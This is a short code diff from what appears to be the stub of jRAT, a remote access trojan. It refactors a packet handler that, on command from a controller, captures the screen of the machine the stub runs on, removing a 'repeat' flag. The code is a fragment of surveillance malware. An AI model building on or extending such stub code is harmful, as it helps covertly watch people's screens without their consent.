@@ -5,16 +5,6 @@ import su.jrat.stub.Screen;
 
 public class Packet12RemoteScreen extends AbstractIncomingPacket {
 	
-	private boolean repeat;
-	
-	public Packet12RemoteScreen() {
-		this.repeat = true;
-	}
-	
-	public Packet12RemoteScreen(boolean repeat) {
-		this.repeat = repeat;
-	}
-
 	@Override
 	public void read() throws Exception {
 		int size = Connection.readInt();
@@ -22,7 +12,7 @@ public class Packet12RemoteScreen extends AbstractIncomingPacket {
 		int monitor = Connection.readInt();
 		
 		//new Thread(new Screen(repeat, size, quality, monitor)).run();
-		new Screen(repeat, size, quality, monitor).run();
+		new Screen(size, quality, monitor).run();
 	}
 
 }
